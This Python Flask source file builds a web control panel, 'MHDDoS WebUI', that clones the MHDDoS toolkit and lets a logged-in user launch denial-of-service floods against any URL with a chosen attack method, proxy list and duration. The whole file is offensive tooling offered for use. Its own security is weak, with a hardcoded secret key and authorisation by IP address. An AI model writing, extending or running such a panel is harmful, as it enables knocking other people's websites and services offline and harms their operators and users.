# MHDDoS WebUI
# Made by EletrixTime

from flask import Flask, render_template, request, redirect, url_for, flash, jsonify,send_from_directory,send_file
import os
import json
import subprocess
import threading
import uuid
# checking if the MHDDOS folder exist
if not os.path.exists("data/mhddos"):
    os.system("git clone https://github.com/MatrixTM/MHDDoS data/mhddos")
    os.system("cd data/mhddos && pip3 install -r requirements.txt")
AUTHORIZED_IPS = []
ATTACKS = [] #ex : attacks[0] = "data/UUID.txt"
app = Flask(__name__,template_folder="html")
app.secret_key = "secretqs^pdqsqdqd4q65sd465q"
class LOGS():
    def warning(text):
        print(f"[WARNING] {text}")
    def error(text):
        print(f"[ERROR] {text}")
    def info(text):
        print(f"[INFO] {text}")



LOGS.info("Loading config.json")
JSONCONFIG = json.loads(open("data/config.json", "r").read())

@app.before_request
def before_request():
    # verife if the request url dont contais /static
    if request.path.startswith("/static") or request.path.startswith("/index"):
        return
    elif request.remote_addr not in AUTHORIZED_IPS:
        LOGS.error("Unauthorized IP address: " + request.remote_addr)
        flash("Please login")
        return render_template("index.html"),403
@app.route("/static/<string:path>")
def send_assets_static(path):
    try:
        return send_file(os.path.join("html/static", path)),200
    except:
        return "404",404

@app.route("/index",methods=["GET","POST"])
def index():
    if request.method == "POST":
        LOGS.info("Login request received (from " + request.remote_addr + ")")
        if request.form["password"] == JSONCONFIG["admin_password"]:
            LOGS.info("Login success")
            AUTHORIZED_IPS.append(request.remote_addr)
            return redirect(url_for("dashboard"))     
        else:
            flash("Invalid password.")
            LOGS.error("Login failed")
    
    return render_template("index.html")
@app.route("/attack/new/sevenlayer",methods=["GET","POST"])
def newattack():
    if request.method == "POST":
        LOGS.info("New attack request received (from " + request.remote_addr + ")")
        type_attack = request.form["attacktype"]
        url = request.form["url"]
        time = request.form["time"]
        # startinng the attack 
        out = "ERROR"
        def run_attack():
            global out
            arguments = [f"{type_attack}", f"{url}", str(0), str(100), "proxies.txt",str(0) , f"{time}"]
            command = ["python3", "data/mhddos/start.py"] + arguments

            try:
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

                outthread = ""
                for stdout_line in iter(process.stdout.readline, ""):
                    with open("data/" + str(uuid.uuid4()) + ".txt", "w") as f:
                        f.write(stdout_line)
                    outthread += stdout_line
                for stderr_line in iter(process.stderr.readline, ""):
                    with open("data/" + str(uuid.uuid4()) + ".txt", "w") as f:
                        f.write(stderr_line)
                    outthread += stderr_line

                #process.stdout.close()
                #process.stderr.close()
                
                process.wait()
                LOGS.info("ATTACK ARGUMENTS: " + str(arguments))

                LOGS.info(f"Attack output: {outthread}")

                LOGS.info("Attack Launched (threaded)")
                out = "Launching (this may take a while)"
            except Exception as e:
                out = f"Error running attack: {e}"
                LOGS.error(outthread)

        attack_thread = threading.Thread(target=run_attack)
        attack_thread.daemon = True
        attack_thread.start()
        flash(f"Attack launched \n {out}")
        flash("Done please wait... (can take a while)")

    return render_template("dash.html",attackout=out)
@app.route("/dash")
def dashboard():
    return render_template("dash.html")

LOGS.info("MHDDoS WebUI starting...")

app.run(host=JSONCONFIG["server_ip"], port=int(JSONCONFIG["server_port"]))
